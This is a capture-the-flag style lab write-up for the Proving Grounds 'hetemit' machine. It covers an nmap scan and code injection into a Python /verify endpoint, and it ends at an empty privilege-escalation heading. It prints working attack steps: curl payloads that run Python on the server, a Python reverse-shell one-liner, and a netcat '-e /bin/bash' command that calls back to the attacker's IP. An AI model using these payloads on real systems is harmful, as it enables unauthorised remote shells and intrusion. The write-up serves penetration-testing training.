---
description: Notes for the Proving Grounds Practice hetemit lab
---

# hetemit

Begin with wide nmap scan:

```shell-session
kali@kali:~$ nmap -sV -A -oN nmapFirstScan.txt 192.168.194.117
Nmap scan report for 192.168.194.117
Host is up (0.062s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT      STATE  SERVICE     VERSION
21/tcp    open   ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.201
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 b1:e2:9d:f1:f8:10:db:a5:aa:5a:22:94:e8:92:61:65 (RSA)
|   256 74:dd:fa:f2:51:dd:74:38:2b:b2:ec:82:e5:91:82:28 (ECDSA)
|_  256 48:bc:9d:eb:bd:4d:ac:b3:0b:5d:67:da:56:54:2b:a0 (ED25519)
80/tcp    closed http
139/tcp   open   netbios-ssn Samba smbd 4.6.2
445/tcp   open   netbios-ssn Samba smbd 4.6.2
50000/tcp open   http        Werkzeug httpd 1.0.1 (Python 3.6.8)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: Werkzeug/1.0.1 Python/3.6.8
Device type: general purpose|firewall|storage-misc|WAP
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (91%), WatchGuard Fireware 11.X (86%), Synology DiskStation Manager 5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:watchguard:fireware:11.8 cpe:/o:linux:linux_kernel cpe:/a:synology:diskstation_manager:5.1 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 3.10 - 3.12 (91%), Linux 4.4 (91%), Linux 4.9 (90%), Linux 3.11 - 4.1 (86%), Linux 3.10 (86%), Linux 2.6.32 (86%), Linux 2.6.32 or 3.10 (86%), Linux 2.6.39 (86%), WatchGuard Fireware 11.8 (86%), Linux 4.0 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Unix

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-07T03:31:31
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   63.39 ms 192.168.45.1
2   63.51 ms 192.168.45.254
3   64.58 ms 192.168.251.1
4   64.77 ms 192.168.194.117

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  6 21:32:10 2023 -- 1 IP address (1 host up) scanned in 65.17 seconds
```

It is worth noting that in a different scan (focused directly at port 50000) the service was found to be `ibm-db2`.

## Injection

Navigating through the browser leads to the discovery of a `/generate` and a `/verify` page.

The `/verify` page is of particular interest as it appears to contain a field named "`code`" which is perhaps inject-able/executable.

{% code title="http://192.168.210.117:50000/verify" %}
```html
<html><head></head><body>{'code'}</body></html>
```
{% endcode %}

Attempting to probe the field with a `curl` command:

```shell-session
kali@kali:~$ curl -X POST http://192.168.210.117:50000/verify --data "code=2*2"
4 
```

Some form of code is indeed executable.

Looking back to the original nmap scan, the output noted a Python version for the service at port 50000. Given that it is worth assuming that the code field is going to use Python.&#x20;

```shell-session
kali@kali:~$ curl -X POST http://192.168.210.117:50000/verify --data "code=import os; os.getcwd()"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Maybe the import statement was unnecessary?

```shell-session
kali@kali:~$ curl -X POST http://192.168.210.117:50000/verify --data "code=os.getcwd()" 
/home/cmeeks/restjson_hetemit
```

It has been verified that the code field can be injected and that code should be written in Python.

### User Shell

Ideally a reverse shell could be created from this injection.

For awhile I played with attempting to create a shell in Python using some form of the following one-liner:

{% code overflow="wrap" %}
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.45.201',80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);
```
{% endcode %}

Unfortunately these attempts were unsuccessful.&#x20;

Switched to trying to run netcat via the underlying OS. I was able to generate a successful connection back to my machine (not full shell just a probe to see if netcat was installed and accessible).

```shell-session
kali@kali:~$ curl -X POST http://192.168.193.117:50000/verify --data "code=os.system('nc 192.168.45.201 80')"
0
```

The return of `0` is the Linux exit code. However the functionality was verified through a netcat listener that received a ping from the machine:

```shell-session
kali@kali:~$ sudo nc -lvnp 80                                   
[sudo] password for qwerzxcv: 
listening on [any] 80 ...
connect to [192.168.45.201] from (UNKNOWN) [192.168.193.117] 60042
```

Now netcat needs to be piped in such a way as to be a valid reverse shell. It is worth starting with the `-e` flag which is the simplest method.

{% code overflow="wrap" %}
```shell-session
kali@kali:~$ curl -X POST http://192.168.193.117:50000/verify --data "code=os.system('nc 192.168.45.201 80 -e /bin/bash')"
```
{% endcode %}

This gained a working shell!

## Privilege Escalation

